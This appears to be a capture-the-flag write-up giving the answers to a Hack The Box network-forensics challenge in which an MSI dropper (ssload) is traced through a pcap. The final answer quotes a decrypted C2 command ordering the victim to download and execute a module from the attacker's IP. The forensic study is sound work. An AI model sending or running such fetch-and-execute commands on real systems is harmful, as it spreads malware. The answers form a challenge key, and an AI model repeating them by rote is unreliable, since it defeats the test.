




# Steps to solve:-
---


1) **Download the file :** wget -O Interceptor.zip "https://labs.hackthebox.com/api/v4/challenges/968/cdn...."

2) **Unzip the file:** sudo 7z x  Interceptor.zip
	
	  There is one pcap file namely  Intercepto.pcap
	 




### 1) What IP address did the original suspicious traffic come from?

#### Answer :- 10.4.17.101


### 2) The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?

-  By analyzing the traffic we saw that this method is used to retrieve the properties.

#### Answer :- PROPFIND


### 3) It appears that this file is malware. What is its filename?

-  In wireshark go to export objects and click http then analyze and found that malware file appears to be avp.msi because it is executed file.

#### Answer :- avp.msi


### 4) What is the SSDEEP hash of the malware as reported by VirusTotal?

-  Now find the sha256 hash of that file and paste in virus total.
- Then to go Details section and there you will find the SSDEEP hash.

#### Answer :- 24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz


### 5) According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?

-  Check the comment.

#### Answer :- ssload


### 6) What is the creation time of the malware?

-  Check in Detail section you will find the creation time of the malware.

#### Answer :- 2009-12-11 11:47:44


### 7) What is the domain name that the malware is trying to connect with?

-  In the Relation section you will find the contacted domain name that the malware is trying to connect with.

#### Answer :- api.ipify.org


### 8) What is the IP address that the attacker has consistently used for communication?

- `Filter with http` and by analyzing the traffic we can say that this  `85.239.53.219` IP address is consistently used for communication

#### Answer :- 85.239.53.219


### 9) Which file, included in the original package, is extracted and utilized by the malware during execution?

-  In the Bundled file section under Relation section you will see a` file type is Win32 dll and file name is forcedelctl.dll` (and we know that victim machine is Windows based), so we can conclude that malware was included in the original package.

#### Answer :- forcedelctl.dll


### 10) What program is used to execute the malware?

-  In the Process and service action under Behavior section of virustotal you will find the program used to executed the malware.

#### Answer :- msiexec.exe


### 11) What is the hostname of the compromised machine?

-  Filter with http and by analyzing the traffic you will notice that a POST request method is made with URI /api/gateway

![[Pasted image 20250821222524.png]]

#### Answer :- DESKTOP-FWQ3U4C


### 12) What is the key that was used in the attack?

-  In the response of POST request , HTTP success 200 is received with the key.

![[Pasted image 20250821223112.png]]

#### Answer :- WkZPxBoH6CA3Ok4iI


### 13) What is the os_version of the compromised machine?

-  In the same you will find the os_version of the compromised machine.

#### Answer :- Windows 6.3.9600


### 14) What is the owner name of the compromised machine?

-  In the same you will find the owner name of the compromised machine.

#### Answer :- Nevada


### 15) After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?

-  By analyzing the traffic the GET request method is used to request the URI for communicating with C2 server. 
- Attacker executed the command in the script using this URI.

![[Pasted image 20250821232633.png]]
- Or you can find this in the first comment under the Community section the command is mentioned there.

#### Answer :- {"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
